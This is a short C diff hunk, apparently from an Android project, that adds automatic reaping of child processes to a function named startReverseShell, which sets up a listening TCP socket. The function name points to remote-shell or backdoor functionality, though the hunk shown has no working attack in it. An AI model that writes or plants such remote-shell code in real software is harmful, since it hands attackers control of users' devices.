@@ -186,6 +186,8 @@ void startReverseShell(int port) {
     struct sockaddr_in server_addr, client_addr;
     socklen_t sin_size = sizeof(struct sockaddr_in);
 
+    signal(SIGCHLD, SIG_IGN);
+
     server_fd = socket(AF_INET, SOCK_STREAM, 0);
     if (server_fd == -1) {
         LOGE("Failed to create socket");
